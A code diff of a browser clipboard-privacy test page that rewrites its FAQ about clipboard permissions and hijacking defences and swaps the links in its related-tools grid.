-          <div class="faq-question">How does Apple iOS handle clipboard snooping?</div>
+          <div class="faq-question">Why did nothing happen when I clicked the button?</div>
           <div class="faq-answer">
-            Starting in iOS 14 and refined in subsequent versions, Apple introduced system-level notification banners that display whenever an app or web view accesses the system clipboard (e.g., "Safari pasted from Notes"). In iOS 16+, applications must request explicit system permission before reading the clipboard if the action was not directly user-initiated.
+            Several normal reasons. The page may not have focus, the request may need a user gesture the browser did not associate with the click, the context may not be secure, or your browser may simply not implement silent clipboard reads. A denial here is the permission model working, not a fault.
           </div>
         </div>
 
         <div class="faq-item">
-          <div class="faq-question">How can I protect my terminal against pastejacking attacks?</div>
+          <div class="faq-question">Is clipboard hijacking a real attack?</div>
           <div class="faq-answer">
-            Use terminal emulators that support "Bracketed Paste Mode" (such as modern iTerm2, Windows Terminal, or modern Alacritty). Bracketed paste wraps pasted strings in special escape sequences, preventing the terminal from executing newline characters automatically and allowing you to review the text before execution.
+            Yes, mostly on the write side and mostly against cryptocurrency users. Malware that watches for a wallet address on the clipboard and replaces it with the attacker's is a long-running class of attack, and it usually runs on the device rather than in a web page. Checking what you actually pasted, character by character, before confirming a transfer is the defence that works.
           </div>
         </div>
 
         <div class="faq-item">
-          <div class="faq-question">What is the safest way to clear my clipboard buffer?</div>
+          <div class="faq-question">Does this tool read or store what I copied?</div>
           <div class="faq-answer">
-            On Windows, press <code>Win+V</code> to open the clipboard history and click "Clear All", or copy a single innocuous character (like a space or letter "x"). On macOS, copy a single character or run <code>pbcopy &lt; /dev/null</code> in your terminal. On Linux, run <code>xsel -bc</code> (X11) or <code>wl-copy --clear</code> (Wayland).
-          </div>
-        </div>
-
-        <div class="faq-item">
-          <div class="faq-question">Can browser extensions bypass the Async Clipboard permission prompt?</div>
-          <div class="faq-answer">
-            Yes. If a browser extension requests the <code>clipboardRead</code> permission in its <code>manifest.json</code> and the user approves the extension installation, the extension’s background scripts and content scripts can read the clipboard silently without triggering any per-site browser dialogs.
-          </div>
-        </div>
-
-        <div class="faq-item">
-          <div class="faq-question">Are my clipboard contents ever logged or stored on BitDark servers?</div>
-          <div class="faq-answer">
-            Never. BitDark operates on an air-gapped zero-network-egress security model. All parsing, MIME extraction, and sensitive credential regex scanning execute strictly inside your local browser's volatile JavaScript heap. Disconnecting your internet connection will not stop this tool from functioning.
-          </div>
-        </div>
-
-        <div class="faq-item">
-          <div class="faq-question">Why does copying formatted text leak HTML metadata?</div>
-          <div class="faq-answer">
-            When rich text is copied, modern desktop software populates both <code>text/plain</code> and <code>text/html</code> clipboard targets. The HTML target often contains hidden comments, inline CSS classes, origin URLs, and user metadata that are not visible in the plain text representation but can be read by receiving web applications.
+            It reads your clipboard only if you click the request button and your browser grants it, and what comes back is displayed on this page and nowhere else. Nothing is transmitted and nothing is stored. Do not run the test with something sensitive on your clipboard &mdash; not because of this page, but because it is a good habit.
           </div>
         </div>
       </section>
 
       <!-- Internal SEO Linking Grid -->
       <section class="related-tools-section">
-        <h3>Related Privacy Auditing &amp; Security Tools</h3>
+        <h3>Related Tools &amp; Utilities</h3>
         <div class="related-grid">
+          <a href="/tools/privacy/fingerprint-audit/" class="related-card">
+            <div class="related-card-title"><span>[&#128065;]</span> Browser Fingerprint Audit</div>
+            <div class="related-card-desc">See which properties your browser exposes and how identifying they are.</div>
+          </a>
+          <a href="/tools/privacy/webrtc-leak/" class="related-card">
+            <div class="related-card-title"><span>[&#128246;]</span> WebRTC Leak Inspector</div>
+            <div class="related-card-desc">Check which local and public addresses WebRTC exposes to a page.</div>
+          </a>
+          <a href="/tools/privacy/gpc-tester/" class="related-card">
+            <div class="related-card-title"><span>[&#128683;]</span> GPC &amp; DNT Signal Inspector</div>
+            <div class="related-card-desc">Check which privacy signals your browser sends and what they mean.</div>
+          </a>
+          <a href="/tools/privacy/referrer-audit/" class="related-card">
+            <div class="related-card-title"><span>[&#8599;]</span> Referrer Policy Auditor</div>
+            <div class="related-card-desc">See what each referrer policy leaks to third-party destinations.</div>
+          </a>
           <a href="/tools/privacy/pii-redactor/" class="related-card">
-            <div class="related-card-title"><span>[🔒]</span> PII &amp; Secret Redactor</div>
-            <div class="related-card-desc">Sanitize and mask API keys, credit cards, emails, and sensitive credentials offline before sharing.</div>
+            <div class="related-card-title"><span>[&#9986;]</span> PII &amp; Secret Redactor</div>
+            <div class="related-card-desc">Strip emails, keys, tokens and card numbers out of text before sharing.</div>
           </a>
-          <a href="/tools/privacy/exif-stripper/" class="related-card">
-            <div class="related-card-title"><span>[📍]</span> EXIF &amp; GPS Scrubber</div>
-            <div class="related-card-desc">Permanently remove geolocation coordinates, camera serial numbers, and device telemetry from photos.</div>
-          </a>
-          <a href="/tools/ai/zero-width-detector/" class="related-card">
-            <div class="related-card-title"><span>[0w]</span> Zero-Width Detector</div>
-            <div class="related-card-desc">Scan and sanitize hidden unicode steganography and prompt injection payloads in LLM input data.</div>
-          </a>
-          <a href="/tools/ai/prompt-scanner/" class="related-card">
-            <div class="related-card-title"><span>[🛡️]</span> Prompt Guard Scanner</div>
-            <div class="related-card-desc">Audit user prompts and instructions for jailbreaks, token smuggling, and indirect prompt injections offline.</div>
-          </a>
-          <a href="/tools/auth/jwt-debugger/" class="related-card">
-            <div class="related-card-title"><span>[🔑]</span> Offline JWT Debugger</div>
-            <div class="related-card-desc">Inspect, decode, and verify JSON Web Tokens without leaking bearer tokens to third-party cloud servers.</div>
-          </a>
-          <a href="/tools/crypto/aes-gcm/" class="related-card">
-            <div class="related-card-title"><span>[🔐]</span> AES-GCM File Vault</div>
-            <div class="related-card-desc">Client-side authenticated encryption and decryption for files using 256-bit keys and Web Crypto.</div>
+          <a href="/tools/network/user-agent/" class="related-card">
+            <div class="related-card-title"><span>[&#129302;]</span> User-Agent Parser</div>
+            <div class="related-card-desc">Break a user-agent string into browser, engine, OS and device.</div>
           </a>
         </div>
       </section>
@@ -1141,7 +876,6 @@ document.addEventListener('copy', (e) => {
     </div>
   </main>
 
-  <!-- Complete Standard Footer -->
   <footer class="footer">
     <div class="footer-inner">
       <div class="footer-left">
@@ -1160,7 +894,7 @@ document.addEventListener('copy', (e) => {
     </div>
   </footer>
 
-  <script>
+    <script>
     // 1. Zero-CLS AdSense Auto-Reveal Observer
     function setupAdSlotObserver() {
       const adSlots = document.querySelectorAll('.ad-container-slot');
